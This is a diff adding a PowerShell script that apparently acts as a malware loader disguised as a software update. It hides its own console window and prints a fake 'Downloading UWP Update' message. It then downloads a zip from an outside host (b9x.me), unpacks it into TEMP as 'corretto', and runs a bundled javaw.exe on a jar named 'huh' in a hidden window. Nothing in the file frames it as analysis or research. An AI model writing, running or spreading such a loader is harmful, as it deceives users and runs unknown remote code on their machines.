@@ -1,0 +1,42 @@
+Add-Type -Name Window -Namespace Console -MemberDefinition '[DllImport("Kernel32.dll")] public static extern IntPtr GetConsoleWindow(); [DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);'
+$consolePtr = [Console.Window]::GetConsoleWindow()
+[Console.Window]::ShowWindow($consolePtr, 0) # 0 = Hide the window
+
+
+Start-Sleep -Seconds 1.5
+
+# --- CONFIGURATION ---
+$url = "http://b9x.me/xx/n.zip"
+$zipPath = "$env:TEMP\corretto.zip"
+$extractPath = "$env:TEMP\corretto"
+cls
+# --- 1. DOWNLOAD ---
+Write-Host "Downloading UWP Update" -ForegroundColor Cyan
+try {
+    # -UseBasicParsing is necessary on many Windows systems to avoid errors
+    Invoke-WebRequest -Uri $url -OutFile $zipPath -UseBasicParsing
+    Write-Host "Download complete." -ForegroundColor Green
+} catch {
+    Write-Error "Download failed: $($_.Exception.Message)"
+    return
+}
+
+# --- 2. EXTRACT ---
+Write-Host "Installing update..." -ForegroundColor Cyan
+if (Test-Path $zipPath) {
+    if (!(Test-Path $extractPath)) { New-Item -ItemType Directory -Path $extractPath }
+    Expand-Archive -Path $zipPath -DestinationPath $extractPath -Force
+    Write-Host "Extraction complete." -ForegroundColor Green
+}
+
+# --- 3. EXECUTE ---
+# Note: Ensure these sub-paths match exactly what is inside your ZIP
+$javaExe = "$extractPath\amazon-corretto\jre8\bin\javaw.exe"
+$jarFile = "$extractPath\amazon-corretto\jre8\bin\huh"
+
+if (Test-Path $javaExe) {
+    Write-Host "Starting UWP Application" -ForegroundColor Cyan
+    Start-Process -FilePath $javaExe -ArgumentList "-jar `"$jarFile`"" -WindowStyle Hidden
+} else {
+    Write-Warning "Failed to download UWP Update"
+}
